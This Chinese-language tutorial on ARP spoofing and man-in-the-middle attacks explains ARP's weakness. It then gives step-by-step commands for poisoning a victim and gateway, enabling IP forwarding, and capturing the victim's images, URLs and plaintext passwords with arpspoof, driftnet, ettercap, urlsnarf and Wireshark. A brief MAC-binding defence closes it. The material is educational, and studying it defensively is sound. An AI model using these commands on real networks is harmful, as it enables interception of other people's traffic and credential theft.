ARP欺骗中间人攻击:


https://www.anquanke.com/post/id/151762

Arp攻击分析
想要进行中间人攻击，先理解最基础的arp攻击
Arp协议

ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，
负责将某个IP地址解析成对应的MAC地址。

以太网（局域网）进行信息传输时，不是根据IP地址进行通信，因为IP地址是可变的，用于通信是不安全的。
然而MAC地址是网卡的硬件地址，一般出厂后就具有唯一性。ARP协议就是将目标IP地址解析成MAC地址进行验证通信。
Arp通信过程

每台主机都会在自己的ARP缓冲区建立一个ARP列表（生命周期二十分钟），用于表示IP地址和MAC地址的对应关系。
主机A若想和主机B通信，首先主机A会查询Arp缓存表（后面称ip-mac缓存表）是否有B主机对应的ip-mac，
有的话就将B主机的mac地址封装到数据包发送。若没有的话，主机A会向以太网发送一个Arp广播包，告诉以太网内的所有
主机自己的ip-mac，并请求B主机（以ip来表示B主机）的mac地址。当B主机收到Arp广播包后，确认A主机是想找自己的
mac地址，就会对A主机进行回应一个自己的mac地址。A主机就会更新自己的ip-mac缓存表，同时B主机也会接收A主机的
ip-mac对应关系到自己的ip-mac缓存表。

Arp协议缺陷

ARP协议信任以太网所有的节点，效率高但是不安全。这份协议没有其它字协议来保证以太网内部信息传输的安全，它不会检查
自己是否接受或发送过请求包，只要它就收到的arp广播包，他就会把对应的ip-mac更新到自己的缓存表
网关的理解

在wiki中这样定义网关：

在计算机网络中，网关（英语：Gateway）是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己
拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关

区别于路由器（由于历史的原因，许多有关TCP/IP的文献曾经把网络层使用的路由器（英语：Router）称为网关，在今天很
多局域网采用都是路由来接入网络，因此现在通常指的网关就是路由器的IP），经常在家庭中或者小型企业网络中使用，用于
连接局域网和Internet。

网关也经常指把一种协议转成另一种协议的设备，比如语音网关。

网关可以把内网ip转化为外网ip，从而向服务器发出请求。也可以把外网Ip获得的数据包转换成内网ip发给内网主机。
Arp攻击原理

根据以上说的arp协议缺陷，如果我们冒充网关主机C，不停的向以太网发送自己的ARP广播包，告知自己的ip-mac，此时其它
主机就会被欺骗，更新我们C的ip-mac为网关主机的ip-mac，那么其它主机的数据包就会发送到C主机上，因为没有发给真正
的网关，就会造成其它主机的网络中断。



操作姿势:

2. 用nmap查看当前网端的活跃主机

nmap -sF 192.168.11.0/24

使用 fping来查看对方是否 alive


4. 利用Arpspoof进行欺骗攻击
Kali自带的arpspoof可以很好的进行欺骗:

用法:
    arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host

描述:
    # arpspoof通过伪造的ARP响应包改变局域网中从目标主机（或所有主机）到另一个主机（host）的数据包转发路径。这是交换局域网中嗅探网络流量的一种极为有效的方法。内核IP转发（或如fragrouter这样的、用户层面的、能完成同样功能的软件）必须提前开启。

参数:
    -i interface
        # 指定要使用的接口（即指定一块网卡）

    -c own|host|both
        # 指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。使用伪造的硬件地址可能导致某些配置下的交换网络、AP网络或桥接网络通信中断，然而它比起默认值————使用自己的硬件地址要工作地更为可靠。

    -t target
        # 指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机。

    -r  
        # 毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）

    host   #你想要截获数据包的主机 (通常是网关)。

5. 主机A作为网关主机欺骗
命令语句

arpspoof -i eth0 -t 192.168.11.105 192.168.1.1

6. 被攻击主机B网络中断
我们在B主机用arp -a (windows下)查看一下是否欺骗成功
在kali终端输入control + c 可以停止，清空并恢复原来正确的arp相应包，主机重新恢复联网状态


基于Arp攻击理解下的MITM

在前面Arp成功进行攻击后，我们开始作为中间人进行欺骗，需要设置ip转发，获取目标主机B的流量，其后配合其它工具(drifnet)等进行进一步嗅探。

值得一提的是，我们的Arp攻击也是欺骗，但它是单向欺骗，冒充网关主机来欺骗目标主机。实际中，中间人攻击一般是双向欺骗。即作为中间人，主机A
双向欺骗主机B与C获得通信内容，但是不破坏通信数据的传输。为了不影响B与C传输的数据丢失，主机A开启ip转发，开启后来自B主机的数据包经过A主
机的Kali后转发给主机C。欺骗两个主机B和C后，我们就能嗅探到双向数据包。


linux的ip转发

linux因为系统安全，是不支持IP转发的，其配置文件写在/proc/sys/net/ipv4的ip_forward中。默认为0，需要修改为1。

开启方法大致有两种：

    只接进入文件修改

    cd /proc/sys/net/ipv4
    ls
    cat ip_forward
    #显示结果为0
    echo 1 > ip_forward
    cat ip_forward
    #显示结果为1，修改成功

    使用echo

    # echo  "1"> /proc/sys/net/ipv4/ip_forward

对网关和目标主机B的双向欺骗

这里进行一步执行，选用第二种Ip转发手段
命令如下：

$ root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward
$ arpspoof -i eth0 -t 192.168.11.105 -r 192.168.11.1


利用driftnet进程监控

持续保持欺骗，再重新打开一个命令终端。
输入命令：

root@kali:~# driftnet -i eth0

跳出来的drift窗口即会显示本机正在浏览的图片
使用ettercap工具获取密码

    打开新的终端，输入 attercap -G 启动工具
    点击Sniff -> unified sniffing，选择要抓包的网卡，默认是自己的网卡eth0，点确定
    然后单击Hosts -> Scan for host，待扫描完成后再次Scan for host，此时可以看到ettercap-NG已经扫描的主机列表
    选择攻击目标，点击192.168.11.105的ip地址，点击Add to Target 1 ，然后选择网关的ip地址192.168.11.1，点击Add to Target 2
    明确目标攻击方式：点击Mitm -> arp poisoning -> Sniff remote connections -> 确定
    开始监听：start -> Start sniffing

工具就会抓取主机B的数据包和主机C返回的数据包,分析http post请求可以判断账号密码信息。
urlsnarf：获得受害者的HTTP请求

输入命令：

root@kali:~# urlsnarf -i eth0

使用Wireshark抓包

使用Wireshark抓取所有的数据包，过滤分析不同请求，类似于ettercap。
例如，要找HTTP POST请求，过滤，查看明文密码，一般是以POST形式上传的账号密码


防御原理很简单，就是不让攻击者肆意表明自己就是网关主机。我们进入网关主机（路由器后台地址），
网络参数一栏一般有ip与mac绑定一栏，把网关的mac地址与网关地址绑定就好了。
只要确定了对应关系，当攻击者发布arp相应包时，就不会更新相应的ip-mac缓存表。
